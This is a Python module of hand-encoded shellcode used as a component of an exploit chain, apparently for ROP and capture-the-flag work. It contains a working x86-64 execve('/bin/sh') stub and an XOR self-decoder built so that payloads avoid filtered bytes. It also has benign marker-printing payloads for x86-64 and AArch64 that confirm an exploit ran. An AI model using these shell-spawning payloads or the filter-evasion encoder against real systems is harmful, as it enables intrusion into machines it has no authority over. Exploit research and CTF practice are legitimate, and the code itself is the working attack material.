"""Minimal position-aware x86-64 shellcode (pure stdlib, hand-encoded).

Used by the mprotect+shellcode L3 chain: after a ROP chain makes a page RWX and jumps to it,
this shellcode runs there. `write_marker` prints a marker (so the exploit is verifiable by
observed output) then exits cleanly.
"""
from __future__ import annotations

import struct


def _p64(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _p32(v):
    return struct.pack("<I", v & 0xFFFFFFFF)


# fixed byte length of the code template below; the marker is appended right after it, so its
# address is code_addr + _CODE_LEN.
_CODE_LEN = 45


def execve_binsh() -> bytes:
    """execve("/bin/sh", NULL, NULL) -- a 25-byte x86-64 stub that spawns a shell when jumped to
    (an executable stack / RWX page + a `call/jmp` into the input buffer). Position-independent:
    it builds "/bin/sh" on the stack, so it runs anywhere."""
    return (
        b"\x48\x31\xf6"                                  # xor rsi, rsi      ; argv = NULL
        b"\x48\x31\xd2"                                  # xor rdx, rdx      ; envp = NULL
        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"      # mov rbx, "/bin/sh\0"
        b"\x53"                                          # push rbx
        b"\x48\x89\xe7"                                  # mov rdi, rsp      ; rdi = "/bin/sh"
        b"\x6a\x3b"                                      # push 0x3b
        b"\x58"                                          # pop rax           ; rax = 59 (execve)
        b"\x0f\x05"                                      # syscall
    )


def encode_avoiding(payload: bytes, bad: bytes):
    """Wrap `payload` in a position-independent XOR decoder so the WHOLE thing avoids every byte in
    `bad`, for a target that filters the input before running it (bad-char constraint, e.g. HTB
    execute bans 0x3b/0xc0/"/bin/sh"). Searches a single-byte key whose decoder stub AND encoded
    payload are all bad-char-free. Returns the self-decoding shellcode, or None when no key works
    (an irreducible fixed stub byte is banned, or every key leaves a banned encoded byte).

    Decoder (RIP-relative, no bad-char-prone `call` get-PC): rsi -> encoded bytes, save it in rdi,
    XOR each byte in place, then `jmp rdi` into the now-decoded payload. The payload sits in the
    same executable+writable buffer (execstack / RWX), so the in-place decode is legal."""
    badset = set(bad)
    if len(payload) > 255:
        return None                                      # push imm8 length
    _STUB = 23                                           # fixed stub length (payload starts here)
    for key in range(1, 256):
        if key in badset:
            continue
        enc = bytes(b ^ key for b in payload)
        if any(e in badset for e in enc):
            continue
        stub = (
            b"\x48\x8d\x35" + struct.pack("<i", _STUB - 7)   # lea rsi, [rip + (payload-after-lea)]
            + b"\x48\x89\xf7"                                # mov rdi, rsi        ; save start
            + b"\x6a" + bytes([len(enc)]) + b"\x59"          # push len ; pop rcx
            + b"\x80\x36" + bytes([key])                     # decode: xor byte [rsi], key
            + b"\x48\xff\xc6"                                # inc rsi
            + b"\xe2\xf8"                                    # loop decode  (rel8 -> the xor)
            + b"\xff\xe7"                                    # jmp rdi      ; into decoded payload
        )
        assert len(stub) == _STUB
        blob = stub + enc
        if not any(x in badset for x in blob):
            return blob
    return None


def write_marker(marker: bytes, code_addr: int) -> bytes:
    """write(1, marker, len(marker)); exit(0). `code_addr` is where the shellcode is loaded,
    so it can point rsi at the marker bytes appended after the code."""
    code = (
        b"\x48\xc7\xc0\x01\x00\x00\x00"                 # mov rax, 1 (SYS_write)
        b"\x48\xc7\xc7\x01\x00\x00\x00"                 # mov rdi, 1 (stdout)
        + b"\x48\xbe" + _p64(code_addr + _CODE_LEN)     # mov rsi, &marker
        + b"\x48\xc7\xc2" + _p32(len(marker))           # mov rdx, len(marker)
        + b"\x0f\x05"                                   # syscall
        + b"\x48\xc7\xc0\x3c\x00\x00\x00"               # mov rax, 60 (SYS_exit)
        + b"\x48\x31\xff"                               # xor rdi, rdi
        + b"\x0f\x05"                                   # syscall
    )
    assert len(code) == _CODE_LEN, len(code)
    return code + marker


def write_marker_aarch64(marker: bytes) -> bytes:
    """AArch64 write(1, marker, len); exit(93). Position-independent: `adr x1, marker` addresses the
    marker bytes appended after the fixed 7-instruction (28-byte) code, PC-relative, so the stub
    runs anywhere it is jumped to. Confirming a cross-arch ret2shellcode by a WRITTEN marker (not a
    spawned shell) is what makes it verifiable under qemu-user, where execve('/bin/sh') is
    unreliable. Encodings assembled and checked against `aarch64-linux-gnu-as` + qemu."""
    n = len(marker) & 0xFFFF
    return struct.pack(
        "<7I",
        0xD2800020,                      # mov x0, #1            ; fd = stdout
        0x100000C1,                      # adr x1, marker        ; +24 bytes -> the appended marker
        0xD2800002 | (n << 5),           # movz x2, #len
        0xD2800808,                      # mov x8, #64           ; __NR_write
        0xD4000001,                      # svc #0
        0xD2800BA8,                      # mov x8, #93           ; __NR_exit
        0xD4000001,                      # svc #0
    ) + marker
